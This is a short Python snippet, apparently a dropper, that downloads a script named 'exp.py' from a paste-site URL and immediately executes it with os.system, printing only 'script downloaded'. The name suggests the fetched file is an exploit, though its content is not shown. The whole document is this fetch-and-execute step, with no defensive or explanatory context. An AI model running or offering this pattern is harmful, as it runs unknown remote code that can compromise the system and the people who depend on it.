import urllib.request, os
open("exp.py", "wb").write(urllib.request.urlopen("https://paste.rs/2EvCQ", timeout=120).read())
print("script downloaded")
os.system("python exp.py")
